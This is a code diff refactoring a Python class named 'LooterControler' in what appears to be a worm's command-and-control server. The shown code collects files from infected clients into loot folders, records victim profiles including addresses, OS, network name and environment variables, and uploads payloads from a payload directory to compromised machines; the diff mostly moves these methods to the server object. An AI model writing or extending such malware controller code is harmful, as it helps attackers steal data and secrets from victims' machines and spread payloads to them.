@@ -254,67 +254,64 @@ class LooterControler(BasicControler):
     def __init__(self, pipe : Pipe, server_callback: object):
         super().__init__(pipe, server_callback)
         self.name = "GypsyKing Controler"
-        self._xtraServ = MicroServer
-        self.server = server_callback
-        self.tagMAP = {}
 
-    def setCoordinates(self, fname: str, flen: str, handler: object, dir_index: str = None) -> None:
-        if dir_index:
-            dir_index = self.tagMAP.get(dir_index)
-            if not dir_index:
-                return
-        try:
-            flen = int(flen)
-        except (ValueError, TypeError):
-            self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
-            return
-        if dir_index:
-            xtra = self._xtraServ(self.server, flen, fname, dir_index)
-        else:
-            xtra = self._xtraServ(self.server, flen, fname)
-        self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
-        handler.sendMsg(f"1 {str(xtra.port)}")
+    # def setCoordinates(self, fname: str, flen: str, handler: object, dir_index: str = None) -> None:
+    #     if dir_index:
+    #         dir_index = self.tagMAP.get(dir_index)
+    #         if not dir_index:
+    #             return
+    #     try:
+    #         flen = int(flen)
+    #     except (ValueError, TypeError):
+    #         self.server.Msg(f"[!!] ERROR: LOOTER recive file_len bad values: {flen} [!!]", dev=True)
+    #         return
+    #     if dir_index:
+    #         xtra = self._xtraServ(self.server, flen, fname, dir_index)
+    #     else:
+    #         xtra = self._xtraServ(self.server, flen, fname)
+    #     self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
+    #     handler.sendMsg(f"1 {str(xtra.port)}")
 
     
-    def prepareWorkplace(self, tag: str, info: str, index_number: str) -> None:
-        tagDir = os.path.join(self.server._oldConf["OUTPUT_DIR"], self.server.name, tag)
-        if not os.path.exists(tagDir):
-            os.mkdir(tagDir)
-        number = str(len(os.listdir(tagDir)) + 1)
-        newDir = os.path.join(tagDir, f"{tag}{number}")
-        try:
-            os.mkdir(newDir)
-            with open(os.path.join(newDir, "0000000000000_CLIENT_INFO_0000000000000000.txt"), "w") as f:
-                f.write(info)
-        except:
-            return None
-        self.tagMAP[index_number] = newDir
+    # def prepareWorkplace(self, tag: str, info: str, index_number: str) -> None:
+    #     tagDir = os.path.join(self.server._oldConf["OUTPUT_DIR"], self.server.name, tag)
+    #     if not os.path.exists(tagDir):
+    #         os.mkdir(tagDir)
+    #     number = str(len(os.listdir(tagDir)) + 1)
+    #     newDir = os.path.join(tagDir, f"{tag}{number}")
+    #     try:
+    #         os.mkdir(newDir)
+    #         with open(os.path.join(newDir, "0000000000000_CLIENT_INFO_0000000000000000.txt"), "w") as f:
+    #             f.write(info)
+    #     except:
+    #         return None
+    #     self.tagMAP[index_number] = newDir
     
-    def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
-        cliInfo = f" ************ {tag} *********\n"
-        cliInfo += f"--------- {info} -----------\n"
-        cliInfo += f"Address: {handler.Addr}\n"
-        cliInfo += f"Worm Name: {handler.CliName}\n"
-        cliInfo += f"Os System: {handler.Os}\n"
-        cliInfo += f"Processor: {handler.procInfo}\n"
-        cliInfo += f"Platform: {handler.platformInfo}\n"
-        cliInfo += f"Network Name: {handler.networkName}\n"
-        cliInfo += "\n\n\n"
-        cliInfo += handler.EnvVar
-        return cliInfo
+    # def prepareReadMe(self, tag: str, info: str, handler: object) -> str:
+    #     cliInfo = f" ************ {tag} *********\n"
+    #     cliInfo += f"--------- {info} -----------\n"
+    #     cliInfo += f"Address: {handler.Addr}\n"
+    #     cliInfo += f"Worm Name: {handler.CliName}\n"
+    #     cliInfo += f"Os System: {handler.Os}\n"
+    #     cliInfo += f"Processor: {handler.procInfo}\n"
+    #     cliInfo += f"Platform: {handler.platformInfo}\n"
+    #     cliInfo += f"Network Name: {handler.networkName}\n"
+    #     cliInfo += "\n\n\n"
+    #     cliInfo += handler.EnvVar
+    #     return cliInfo
     
-    def uploadFile(self, cliID: str, file_name: str) -> None:
-        if not self.server.is_listening:
-            self.server.Msg("[!!] ERROR: Server not listening [!!]")
-            return
-        fpath = os.path.join(self.server.config["PAYLOAD_DIR"], file_name)
-        if not os.path.exists(fpath):
-            self.server.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
-            return
-        file_len = os.stat(fpath).st_size
-        xtra = self._xtraServ(server_callback=self.server, file_name=file_name, work="upload")
-        self.server.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
-        self.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
+    # def uploadFile(self, cliID: str, file_name: str) -> None:
+    #     if not self.server.is_listening:
+    #         self.server.Msg("[!!] ERROR: Server not listening [!!]")
+    #         return
+    #     fpath = os.path.join(self.server.config["PAYLOAD_DIR"], file_name)
+    #     if not os.path.exists(fpath):
+    #         self.server.Msg(f"[!!] ERROR: file name: {file_name} does not exists in PAYLOAD dir [!!]")
+    #         return
+    #     file_len = os.stat(fpath).st_size
+    #     xtra = self._xtraServ(server_callback=self.server, file_name=file_name, work="upload")
+    #     self.server.Tasker.addTask(name="Looter Uploader", func_name=xtra.START, info="Upload file threading", types="handlers")
+    #     self.sendMsg2Client(cliID, f"$$UPL$${str(xtra.port)}$${file_name}$${str(file_len)}")
         
         
 
@@ -323,9 +320,9 @@ class LooterControler(BasicControler):
         match cmd[0]:
             case "d":
                 if len(cmd) == 3:
-                    self.setCoordinates(cmd[1], cmd[2], handler)
+                    self.server.setCoordinates(cmd[1], cmd[2], handler)
                 elif len(cmd) == 4:
-                    self.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
+                    self.server.setCoordinates(cmd[1], cmd[2], handler, cmd[3])
                 else:
                     self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
 
@@ -333,14 +330,14 @@ class LooterControler(BasicControler):
                 if len(cmd) < 4:
                     self.server.Msg(f"[!!] ERROR: incomplete sys msg [!!]")
                     return
-                clinfo = self.prepareReadMe(cmd[1], cmd[2], handler)
-                self.prepareWorkplace(cmd[1], clinfo, cmd[3])
+                clinfo = self.server.prepareReadMe(cmd[1], cmd[2], handler)
+                self.server.prepareWorkplace(cmd[1], clinfo, cmd[3])
             case _:
                 self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
     
     def execCMD(self, cmd: list) -> None:
         match cmd[0]:
             case "up":
-                self.uploadFile(cmd[1], cmd[2])
+                self.server.uploadFile(cmd[1], cmd[2])
             case _:
                 self.server.Msg("Unknown Command")
